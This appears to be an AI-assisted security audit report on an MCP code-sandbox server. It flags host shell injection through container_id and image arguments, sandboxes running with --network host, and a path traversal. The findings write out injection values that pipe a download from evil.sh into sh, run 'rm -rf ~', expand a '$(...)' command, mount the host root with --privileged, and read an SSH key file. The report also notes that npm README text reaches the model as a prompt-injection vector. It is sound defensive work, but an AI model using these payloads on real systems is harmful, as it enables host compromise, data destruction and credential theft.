# Agent & MCP security report

Scanned: `/tmp/blind/c41` · 2026-11-23T20:50:14+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 4 | 1 | 0 | 1 | 0 | 0 | 1 |

## What was checked

- MCP servers in config files: **1** · tools found in code: **7** · agent/MCP code files: **4** · agent instruction files: **0**
- Frameworks seen: mcp, modelcontextprotocol, openai

## Findings

### M001 · CRITICAL · sandbox_exec: container_id and commands reach the HOST shell via execSync
`None:None` · ASI05 Unexpected Code Execution

execSync runs the string through the host /bin/sh: container_id='x; curl evil.sh | sh #' runs on the host, and because JSON.stringify only wraps cmd in double quotes, a command like "$(id > /tmp/pwn)" or backticks is expanded by the host shell before docker ever sees it, so the 'run inside the sandbox' tool escapes to the host.
> `src/tools/exec.ts:7` — `container_id: z.string(),`
> `src/tools/exec.ts:28` — ``docker exec ${container_id} /bin/sh -c ${JSON.stringify(cmd)}`,`

**Fix:** Use execFileSync('docker', ['exec', container_id, '/bin/sh', '-c', cmd]) (no host shell) and require container_id to be one the server created (activeSandboxContainers.has(id) and ^js-sbx-[0-9a-f-]+$).

### M002 · CRITICAL · sandbox_stop: container_id interpolated into host shell command
`None:None` · ASI05 Unexpected Code Execution

container_id='x; rm -rf ~ #' (or any command) runs on the host; it also lets the caller remove any container on the host, not just sandbox ones.
> `src/tools/stop.ts:7` — `export const argSchema = { container_id: z.string() };`
> `src/tools/stop.ts:22` — `execSync(`docker rm -f ${container_id}`);`

**Fix:** execFileSync('docker', ['rm', '-f', container_id]) after checking container_id is in activeSandboxContainers.

### M003 · CRITICAL · run_js: container_id interpolated into docker cp / docker exec host shell commands
`None:None` · ASI05 Unexpected Code Execution

container_id from the tool call is pasted unquoted into host shell commands (docker cp, docker exec npm install, safeExecNodeInContainer), so a value containing ; or $( ) executes on the host before any code reaches the container.
> `src/tools/runJs.ts:27` — `container_id: z.string().describe('Docker container identifier'),`
> `src/tools/runJs.ts:74` — `execSync(`docker cp ${localWorkspace.name}/. ${container_id}:/workspace`);`
> `src/dockerUtils.ts:60` — ``docker exec ${containerId} /bin/sh -c  ${JSON.stringify(command)}`,`

**Fix:** Switch all docker calls to execFileSync('docker', [...args]) and validate container_id against the server's registry of created sandboxes.

### M004 · CRITICAL · sandbox_initialize / run_js_ephemeral: image argument interpolated into docker run
`None:None` · ASI05 Unexpected Code Execution

image='node:lts-slim; curl evil.sh | sh #' runs on the host; even without shell metacharacters, image can inject docker run options (e.g. '--privileged -v /:/host node') to break out of the sandbox.
> `src/tools/initialize.ts:24` — `image: z.string().optional(),`
> `src/tools/initialize.ts:64` — ``--name ${containerId} ${image} tail -f /dev/null``
> `src/tools/runJsEphemeral.ts:32` — `image: z`

**Fix:** execFileSync('docker', ['run', ..., '--', image, 'tail', '-f', '/dev/null']) and restrict image to an allowlist (e.g. the keys of suggestedImages).

### M005 · HIGH · Code sandboxes run with --network host by default
`None:None` · ASI02 Tool Misuse / ASI05 Unexpected Code Execution

run_js / run_js_ephemeral execute model-written code by design, but the container shares the host network namespace, so injected code can reach services bound to the host's localhost (databases, admin UIs, other MCP servers) and cloud metadata, and send anything in the mounted FILES_DIR out.
> `src/tools/initialize.ts:47` — `const portOption = port ? `-p ${port}:${port}` : `--network host`; // prefer --network host if no explicit port mapping`
> `src/tools/runJsEphemeral.ts:83` — ``docker run -d --network host ${memFlag} ${cpuFlag} ` +`

**Fix:** Use the default bridge network (or --network none unless the user opts in), publish ports explicitly with -p 127.0.0.1:port:port, and keep client approval on run_js/run_js_ephemeral.

### M007 · LOW · npm README snippets and .d.ts files from the registry returned to the model unmarked
`None:None` · 

Any npm package author controls the README and type files these tools return, which is a way for injected instructions to reach a model that also holds the host-shell injections above.
> `src/tools/getDependencyTypes.ts:45` — `info.types = await contentRes.text();`
> `src/tools/getDependencyTypes.ts:83` — `return { content: [textContent(JSON.stringify(results))] };`

**Fix:** Mark returned third-party text as untrusted data in the result, truncate it, and fix M001-M004 so injected instructions cannot reach the host.

## Needs information from you

- M006 PATH-TRAVERSAL `None:None` — resources/read with file:///home/user/.ssh/id_rsa (or any path) returns the file; there is no check that the path is inside FILES_DIR. Impact depends on whether the MCP client lets the model (rather than only the user) request resources.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
